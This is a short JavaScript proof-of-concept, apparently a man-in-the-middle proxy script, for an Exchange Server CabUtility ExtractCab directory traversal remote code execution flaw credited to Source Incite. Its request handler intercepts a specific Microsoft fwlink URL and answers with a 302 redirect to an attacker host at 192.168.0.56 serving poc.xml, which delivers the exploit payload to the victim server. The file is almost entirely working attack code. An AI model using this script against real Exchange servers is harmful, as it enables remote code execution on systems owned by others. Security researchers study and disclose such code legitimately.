function onLoad() {
    log_info("Exchange Server CabUtility ExtractCab Directory Traversal Remote Code Execution Vulnerability")
    log_info("Found by Steven Seeley of Source Incite")
}

function onRequest(req, res) {
    log_info("(+) triggering mitm");
    var uri = req.Scheme + "://" +req.Hostname + req.Path + "?" + req.Query;
    if (uri === "http://go.microsoft.com/fwlink/p/?LinkId=287244"){
        res.Status = 302;
        res.SetHeader("Location", "http://192.168.0.56:8000/poc.xml");
    }
}
